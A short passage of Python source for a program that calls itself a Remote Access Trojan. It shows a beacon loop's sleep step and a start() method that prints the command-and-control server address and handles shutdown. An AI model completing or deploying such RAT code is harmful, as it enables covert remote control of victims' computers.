                print(f"Beacon error: {e}")

            time.sleep(self.beacon_interval)

    def start(self):
        """Start the RAT"""
        print("Starting Remote Access Trojan...")
        print(f"C2 Server: {self.c2_server}:{self.c2_port}")
        print("Press Ctrl+C to stop")

        try:
            self.beacon()
        except KeyboardInterrupt:
            print("\nStopping RAT...")
            self.should_run = False
            if self.socket:
